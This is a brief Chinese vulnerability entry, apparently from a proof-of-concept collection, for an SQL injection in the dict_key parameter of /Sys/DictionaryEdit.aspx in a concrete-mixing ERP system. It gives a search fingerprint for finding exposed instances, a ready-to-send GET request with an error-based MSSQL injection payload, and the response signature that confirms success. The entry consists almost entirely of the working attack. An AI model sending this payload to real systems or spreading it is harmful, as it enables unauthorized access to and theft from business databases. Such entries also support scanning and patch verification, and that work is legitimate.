# 商混ERP系统sys接口SQL注入漏洞

商混ERP系统sys接口 ｜ SQL注入 ｜ —
- **指纹**：`"商混ERP系统"`
- **请求**：`GET /Sys/DictionaryEdit.aspx?dict_key=1%27%20and%201=convert(varchar(100),substring(sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27)),3,32))-- HTTP/1.1`
- **响应特征**：500 e10adc3949b